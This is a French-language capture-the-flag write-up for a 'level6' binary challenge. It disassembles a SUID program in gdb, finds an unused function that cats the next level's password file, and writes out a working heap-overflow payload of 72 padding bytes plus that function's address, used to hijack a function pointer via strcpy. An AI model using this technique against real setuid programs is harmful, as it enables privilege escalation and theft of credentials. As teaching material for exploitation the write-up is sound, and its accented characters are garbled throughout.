## Analyse

- `ls -la`
  ```
  [...]
    -rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
  [...]
  ```
    - On a un binaire appartenant a level7 dans le home avec les droits SUID.

- `./level6`
  ```
  Segmentation fault (core dumped)
  ```
  - Le programme Segfault sans argument
- `./level6 test`
  ```
  Nope
  ```
  - Le programme affiche Nope avec un argument

- `gdb level6`
  - `set disassembly-flavor intel`
  - `info function`
    ```asm
    [...]
      0x08048454  n
      0x08048468  m
      0x0804847c  main
    [...]
    ```
    - on trouve une fonction n() et une fonction m() en plus du main
  - `disas main`
    ```asm
    Dump of assembler code for function main:
       0x0804847c <+0>:	push   ebp
       0x0804847d <+1>:	mov    ebp,esp
       0x0804847f <+3>:	and    esp,0xfffffff0
       0x08048482 <+6>:	sub    esp,0x20
       0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
       0x0804848c <+16>:	call   0x8048350 <malloc@plt>
       0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
       0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
       0x0804849c <+32>:	call   0x8048350 <malloc@plt>
       0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
       0x080484a5 <+41>:	mov    edx,0x8048468
       0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
       0x080484ae <+50>:	mov    DWORD PTR [eax],edx
       0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
       0x080484b3 <+55>:	add    eax,0x4
       0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
       0x080484b8 <+60>:	mov    edx,eax
       0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
       0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
       0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
       0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
       0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
       0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
       0x080484d0 <+84>:	call   eax
       0x080484d2 <+86>:	leave
       0x080484d3 <+87>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+6>
      - Initialisation de la m??moire (lib??re 32 octets pour la stack), alignement de la stack<br/><br/>
    - <+9> ... <+21>
      - Stocke 0x40 (64) sur la stack (?? esp)
      - Call malloc() avec l'argument stock?? sur la stack
      - Stocke eax (le retour du malloc) sur la stack (?? esp + 28)<br/><br/>
    - <+25> ... <+37>
      - Stocke 0x4 (4) sur la stack (a esp)
      - Call malloc() avec l'argument stock?? sur la stack
      - Stocke eax (le retour du malloc) sur la stack (?? esp + 24)<br/><br/>
    - <+41> ... <+73>
      - Stocke la valeur de 0x8048468 dans edx
        - `x/s 0x8048468`
          ```
          0x8048468 <m>:	 "U\211\345\203\354\030\307\004$??\004\b\350\346\376\377\377\311\303U\211\345\203\344\360\203\354 \307\004$@"
          ```
      - Fait pointer eax sur esp + 24 (le retour du malloc(4))
      - Stocke la valeur de edx (l'adresse de m()) dans eax (malloc(4) => m())
      - Fait pointer eax sur ebp + 12 (&argv)
      - Incr??mente eax de 4 (&argv[1])
      - Stocke la valeur ?? l'adresse de eax dans eax
      - Stocke eax (argv[1]) dans edx
      - Stocke la valeur ?? esp + 28 (le retour du malloc(64)) dans eax
      - Stocke edx (argv[1]) sur la stack (?? esp + 4)
      - Stocke eax (le retour du malloc(64)) sur la stack (?? esp)
      - Call strcpy() avec les arguments stock??s sur la stack<br/><br/>
    - <+78> ... <+84>
      - Stocke la valeur ?? esp + 24 (le malloc(4) contenant l'adresse de m()) dans eax
      - Stocke la valeur ?? l'adresse de eax (l'adresse de m()) dans eax
      - Call eax (donc call m())<br/><br/>
    - <+86> ... <+87>
      - R??initialisation de la m??moire, fin d'ex??cution<br/><br/>

  - `disas m`
    ```asm
    Dump of assembler code for function m:
       0x08048468 <+0>:	push   ebp
       0x08048469 <+1>:	mov    ebp,esp
       0x0804846b <+3>:	sub    esp,0x18
       0x0804846e <+6>:	mov    DWORD PTR [esp],0x80485d1
       0x08048475 <+13>:	call   0x8048360 <puts@plt>
       0x0804847a <+18>:	leave
       0x0804847b <+19>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la m??moire (lib??re 24 octets pour la stack)<br/><br/>
    - <+6> ... <+13>
      - Stocke la valeur de 0x80485d1 sur la stack (?? esp)
        - `x/s 0x80485d1`
          ```
          0x80485d1:	 "Nope"
          ```
      - Call puts() avec l'argument stock?? sur la stack<br/><br/>
    - <+18> ... <+19>
      - R??initialisation de la m??moire, fin d'ex??cution<br/><br/>

  - `disas n`
    ```asm
    Dump of assembler code for function n:
       0x08048454 <+0>:	push   ebp
       0x08048455 <+1>:	mov    ebp,esp
       0x08048457 <+3>:	sub    esp,0x18
       0x0804845a <+6>:	mov    DWORD PTR [esp],0x80485b0
       0x08048461 <+13>:	call   0x8048370 <system@plt>
       0x08048466 <+18>:	leave
       0x08048467 <+19>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la m??moire (lib??re 24 octets pour la stack)<br/><br/>
    - <+6> ... <+13>
      - Stocke la valeur de 0x80485b0 sur la stack (?? esp)
        - `x/s 0x80485b0`
          ```
          0x80485b0:	 "/bin/cat /home/user/level7/.pass"
          ```
      - Call system() avec l'argument stock?? sur la stack<br/><br/>
    - <+18> ... <+19>
      - R??initialisation de la m??moire, fin d'ex??cution<br/><br/>

## Exploit

La fonction main() fait deux appels ?? malloc():
- malloc(64) o?? on va venir copier notre input avec strcpy()
- malloc(4) o?? on va stocker l'adresse de la fonction ?? ex??cuter ?? <main+84> (en l'occurence l'adresse de m())

La fonction m() affiche "Nope" et la fonction n() affiche le contenu du fichier .pass mais n'est pas appel??e.
On comprend que l'on va devoir profiter de [la vul??rabilit?? de strcpy() ?? un buffer overflow](https://www.cisa.gov/uscert/bsi/articles/knowledge/coding-practices/strcpy-and-strcat) pour r????crire l'eip ave l'adresse de n().

On cherche l'offset:
- `gdb level6`
  - `run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A`
    ```
    Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

    Program received signal SIGSEGV, Segmentation fault.
    0x41346341 in ?? ()
    ```
    - [Le g??n??rateur](https://wiremask.eu/tools/buffer-overflow-pattern-generator) nous indique qu'on atteint l'offset ?? 72
 
 On Lance ./level6 avec un payload avec 72 octets random, puis l'adresse de n() en little endian:
- `./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')`
  ```
  f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
  ```
